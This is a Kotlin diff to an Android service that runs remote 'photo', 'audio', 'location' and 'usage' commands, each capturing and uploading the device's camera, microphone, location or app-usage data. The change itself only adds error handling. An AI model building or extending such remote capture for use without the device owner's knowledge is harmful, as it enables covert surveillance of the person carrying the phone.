@@ -122,6 +122,11 @@ class CaptureForegroundService : Service() {
      */
     private var timeoutRunnable: Runnable? = null
 
+    private enum class CommandResult {
+        SUCCESS,
+        ERROR
+    }
+
     private val commandReceiver =
         object : BroadcastReceiver() {
 
@@ -330,11 +335,22 @@ class CaptureForegroundService : Service() {
             TIMEOUT_MS
         )
 
-        val onDone = {
-            finishCommand(
-                command = command,
-                commandId = commandId
-            )
+        val onDone: (CommandResult) -> Unit = { result ->
+            when (result) {
+                CommandResult.SUCCESS -> {
+                    finishCommand(
+                        command = command,
+                        commandId = commandId
+                    )
+                }
+
+                CommandResult.ERROR -> {
+                    failCommand(
+                        command = command,
+                        commandId = commandId
+                    )
+                }
+            }
         }
 
         try {
@@ -343,46 +359,70 @@ class CaptureForegroundService : Service() {
 
                 "photo" -> {
                     CameraCapture(this)
-                        .captureAndUpload {
-                            onDone()
+                        .captureAndUpload { success ->
+                            onDone(
+                                if (success) {
+                                    CommandResult.SUCCESS
+                                } else {
+                                    CommandResult.ERROR
+                                }
+                            )
                         }
                 }
 
                 "audio" -> {
                     AudioCapture(this)
-                        .recordAndUpload(seconds = 10) {
-                            onDone()
+                        .recordAndUpload(seconds = 10) { success ->
+                            onDone(
+                                if (success) {
+                                    CommandResult.SUCCESS
+                                } else {
+                                    CommandResult.ERROR
+                                }
+                            )
                         }
                 }
 
                 "location" -> {
                     LocationCapture(this)
-                        .fetchAndUpload {
-                            onDone()
+                        .fetchAndUpload { success ->
+                            onDone(
+                                if (success) {
+                                    CommandResult.SUCCESS
+                                } else {
+                                    CommandResult.ERROR
+                                }
+                            )
                         }
                 }
 
                 "usage" -> {
                     UsageStatsCapture(this)
-                        .collectAndUpload {
-                            onDone()
+                        .collectAndUpload { success ->
+                            onDone(
+                                if (success) {
+                                    CommandResult.SUCCESS
+                                } else {
+                                    CommandResult.ERROR
+                                }
+                            )
                         }
                 }
             }
 
         } catch (e: Exception) {
 
-            Log.e(
-                TAG,
-                "Fehler beim Starten des Befehls: $command",
-                e
-            )
+        Log.e(
+            TAG,
+            "Fehler beim Starten des Befehls: $command",
+            e
+        )
 
-            finishCommand(
-                command = command,
-                commandId = commandId
-            )
-        }
+        failCommand(
+            command = command,
+            commandId = commandId
+        )
+    }
     }
 
     /**
@@ -421,8 +461,43 @@ class CaptureForegroundService : Service() {
         processNextCommand()
     }
 
+        /**
+         * Fehler beim Ausführen eines Befehls.
+         */
+        private fun failCommand(
+            command: String,
+            commandId: String
+        ) {
+
+            if (activeCommandId != commandId) {
+
+                Log.w(
+                    TAG,
+                    "Verspäteter Fehler-Callback ignoriert: " +
+                        "$command | id=$commandId"
+                )
+
+                return
+            }
+
+            timeoutRunnable?.let {
+                mainHandler.removeCallbacks(it)
+            }
+
+            timeoutRunnable = null
+
+            activeCommand = null
+            activeCommandId = null
+
+            Log.e(
+                TAG,
+                "Fehler: $command | id=$commandId"
+            )
+
+            processNextCommand()
+        }
     /**
-     * Timeout eines laufenden Befehls.
+     * Timeout eines Befehls.
      */
     private fun handleTimeout(
         command: String,
